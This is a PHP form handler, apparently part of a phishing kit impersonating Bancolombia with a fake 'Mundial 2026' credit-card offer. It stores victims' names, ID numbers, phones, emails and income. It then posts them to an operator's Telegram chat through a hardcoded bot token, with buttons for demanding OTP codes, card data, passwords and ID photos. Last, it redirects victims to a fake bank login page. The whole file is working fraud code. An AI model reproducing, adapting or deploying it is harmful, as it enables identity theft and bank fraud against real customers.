<?php
ob_start();
session_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

date_default_timezone_set('America/Bogota');

// ── Lectura de campos del formulario ──────────────────────────────────────
$cupoRaw      = isset($_POST['cupo'])       ? $_POST['cupo']       : '';
$montoTexto   = isset($_POST['monto_texto'])? $_POST['monto_texto']: '';
$clienteTrico = isset($_POST['cliente_trico']) ? $_POST['cliente_trico'] : '';
$celular      = isset($_POST['celular'])    ? $_POST['celular']    : '';
$tipoDoc      = isset($_POST['tipo_doc'])   ? $_POST['tipo_doc']   : '';
$numDoc       = isset($_POST['num_doc'])    ? $_POST['num_doc']    : '';
$nombre       = isset($_POST['nombre'])     ? $_POST['nombre']     : '';
$correo       = isset($_POST['correo'])     ? $_POST['correo']     : '';
$ingresos     = isset($_POST['ingresos'])   ? $_POST['ingresos']   : '';
$departamento = isset($_POST['departamento'])? $_POST['departamento'] : '';
$ciudad       = isset($_POST['ciudad'])     ? $_POST['ciudad']     : '';

// ── Generar key unica + request_id (mismo patron que sendata.php) ────────
$claveUnica = 'sol_' . bin2hex(random_bytes(16));
try {
    $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $e) {
    $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Normalizar datos para guardar en solicitudes ─────────────────────────
$bancoFinal = 'Bancolombia';
$montoFinal = '';
if (trim($montoTexto) !== '') {
    $montoFinal = trim($montoTexto);
} elseif (trim($cupoRaw) !== '') {
    $montoFinal = trim($cupoRaw);
}
$telefonoFinal = trim($celular);
$numeroCuenta = $telefonoFinal;

// ── Upsert en tabla solicitudes ──────────────────────────────────────────
$upsert = $pdo->prepare(
    "INSERT INTO solicitudes
        (`key`, `request_id`, `banco`, `numero_cuenta`, `monto`,
         `nombre`, `telefono`, `correo`, `estado`)
     VALUES
        (:k, :rid, :bco, :nc, :mont, :nom, :tel, :em, 'pendiente')
     ON DUPLICATE KEY UPDATE
         `request_id`   = VALUES(`request_id`),
         `banco`        = IF(VALUES(`banco`) <> '', VALUES(`banco`), `banco`),
         `numero_cuenta`= IF(VALUES(`numero_cuenta`) <> '', VALUES(`numero_cuenta`), `numero_cuenta`),
         `monto`        = IF(VALUES(`monto`) <> '', VALUES(`monto`), `monto`),
         `nombre`       = IF(VALUES(`nombre`) <> '', VALUES(`nombre`), `nombre`),
         `telefono`     = IF(VALUES(`telefono`) <> '', VALUES(`telefono`), `telefono`),
         `correo`       = IF(VALUES(`correo`) <> '', VALUES(`correo`), `correo`),
         `estado`       = 'pendiente'"
);
$upsert->execute(array(
    ':k'    => $claveUnica,
    ':rid'  => $idPeticion,
    ':bco'  => $bancoFinal,
    ':nc'   => $numeroCuenta,
    ':mont' => $montoFinal,
    ':nom'  => trim($nombre),
    ':tel'  => $telefonoFinal,
    ':em'   => trim($correo),
));

// ── Canal Telegram NUEVO (hardcode DEFAULT + getenv override NO-VACIO) ───
$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$token   = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot) && trim($envBot) !== '') { $token = $envBot; }
$chat_id = $DEFAULT_CHAT_ID_OPS;
if (is_string($envCh) && trim($envCh) !== '') { $chat_id = $envCh; }

function fv_sol($v, $ph = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    if ($s === '') { return $ph; }
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// ── Mensaje Telegram SOLICITUD INICIAL (formulario antes de Virtual-Persona)
$SEP = str_repeat("-", 30);
$msg  = "";
$msg .= "\xF0\x9F\x93\x8B <b>[SOLICITUD INICIAL - TARJETA DE CRÉDITO]</b> Datos previos a Virtual-Persona:\n";
$msg .= $SEP . "\n";
$msg .= "\xF0\x9F\x8F\x86 <b>Edición:</b> Mundial 2026 \xF0\x9F\x8F\x86\n";
$msg .= "\xF0\x9F\x92\xB0 <b>Cupo seleccionado:</b> " . fv_sol($montoFinal) . "\n";
$msg .= "\xF0\x9F\x8F\xA6 <b>Banco:</b> Bancolombia\n";
$msg .= "\xE2\x98\x91\xEF\xB8\x8F <b>Cliente Trico:</b> " . fv_sol($clienteTrico) . "\n";
$msg .= "\xF0\x9F\x93\xB1 <b>Celular:</b> " . fv_sol($celular) . "\n";
$msg .= $SEP . "\n";
$msg .= "\xF0\x9F\x86\x94 <b>Datos Personales</b>\n";
$msg .= "\xF0\x9F\xAA\xAA <b>Tipo Documento:</b> " . fv_sol($tipoDoc) . "\n";
$msg .= "\xE2\x84\xB9\xEF\xB8\x8F <b>N\xC3\xBAmero Documento:</b> " . fv_sol($numDoc) . "\n";
$msg .= "\xF0\x9F\x91\xA4 <b>Nombre Completo:</b> " . fv_sol($nombre) . "\n";
$msg .= "\xF0\x9F\x93\xA7 <b>Correo:</b> " . fv_sol($correo) . "\n";
$msg .= "\xF0\x9F\x92\xB5 <b>Ingresos Mensuales:</b> " . fv_sol($ingresos) . "\n";
$msg .= "\xF0\x9F\x93\x8D <b>Departamento:</b> " . fv_sol($departamento) . "\n";
$msg .= "\xF0\x9F\x8F\x99 <b>Ciudad / Municipio:</b> " . fv_sol($ciudad);

$teclado = array(
    'inline_keyboard' => array(
        array(
            array('text' => "\xF0\x9F\x9F\xA2 DINAMICA",           'callback_data' => "OPCION_1_" . $idPeticion),
            array('text' => "\xF0\x9F\x92\xB3 TARJETA",              'callback_data' => "OPCION_2_" . $idPeticion),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA",      'callback_data' => "OPCION_3_" . $idPeticion),
            array('text' => "\xE2\x9D\x8C ERROR CLAVE",             'callback_data' => "OPCION_4_" . $idPeticion),
            array('text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",         'callback_data' => "OPCION_5_" . $idPeticion),
        ),
        array(
            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",            'callback_data' => "OPCION_10_" . $idPeticion),
        ),
    ),
);

$payloadArr = array(
    'chat_id'                  => $chat_id,
    'text'                     => $msg,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true,
    'reply_markup'             => $teclado,
);
$payload = json_encode($payloadArr);

$ch = curl_init("https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Persistir key/request_id en sesión para Virtual-Persona.html ─────────
$_SESSION['key']        = $claveUnica;
$_SESSION['request_id'] = $idPeticion;
$_SESSION['monto']      = $montoFinal;
$_SESSION['banco']      = $bancoFinal;
$_SESSION['telefono']   = $telefonoFinal;
$_SESSION['celular']    = $telefonoFinal;
$_SESSION['correo']     = trim($correo);
$_SESSION['nombre']     = trim($nombre);
$_SESSION['tipo_documento']   = trim($tipoDoc);
$_SESSION['numero_documento'] = trim($numDoc);

// ── Redirigir al flujo EXISTENTE: Virtual-Persona.html (login usuario/clave)
//    Le pasamos key + requestId + datos (identicos a como los esperaba antes sendata)
$redirArr = array(
    'key'         => $claveUnica,
    'requestId'   => $idPeticion,
    'monto'       => $cupoRaw,
    'monto_texto' => $montoFinal,
    'nombre_usuario' => trim($nombre),
    'telefono'    => $telefonoFinal,
    'correo'      => trim($correo),
    'banco'       => $bancoFinal,
    'tipo_documento'   => trim($tipoDoc),
    'numero_documento' => trim($numDoc),
);
$redirQs = http_build_query($redirArr, '', '&', PHP_QUERY_RFC3986);
header("Location: Virtual-Persona.html?" . $redirQs);
exit;
